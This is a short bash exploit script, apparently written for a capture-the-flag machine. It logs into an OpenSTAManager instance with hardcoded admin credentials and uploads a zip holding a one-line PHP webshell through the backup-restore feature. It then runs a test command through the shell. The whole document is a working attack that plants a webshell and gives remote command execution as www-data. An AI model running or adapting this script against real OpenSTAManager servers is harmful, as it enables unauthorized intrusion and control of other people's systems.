#!/usr/bin/env bash
# OpenSTAManager backup restore → an.php webshell (www-data)
set -euo pipefail

IP="${1:-}"
if [[ -z "$IP" ]]; then
  echo "Usage: $0 <target_ip>" >&2
  exit 1
fi

HOST_HDR='Host: support_001.enigma.htb'
BASE="http://${IP}"
COOKIE="${TMPDIR:-/tmp}/osm-cookie-$$.txt"
WORKDIR="${TMPDIR:-/tmp}/osm-evil-$$"
trap 'rm -rf "$WORKDIR" "$COOKIE"' EXIT

mkdir -p "$WORKDIR"
cat > "$WORKDIR/an.php" <<'PHP'
<?php system($_GET["c"]); ?>
PHP
( cd "$WORKDIR" && zip -q evil.zip an.php )

curl -s -c "$COOKIE" -b "$COOKIE" -H "$HOST_HDR" \
  -X POST "${BASE}/?op=login" \
  -d 'username=admin&password=Ne3s4rtars78s' -o /dev/null

curl -s -b "$COOKIE" -H "$HOST_HDR" \
  -X POST "${BASE}/actions.php?id_module=7" \
  -F 'op=restore' -F "blob=@${WORKDIR}/evil.zip" -o /dev/null

echo "[*] Test shell:"
curl -s -H "$HOST_HDR" "${BASE}/an.php?c=id"
echo
echo "[*] URL: http://support_001.enigma.htb/an.php?c=<cmd>  (use Host header or /etc/hosts)"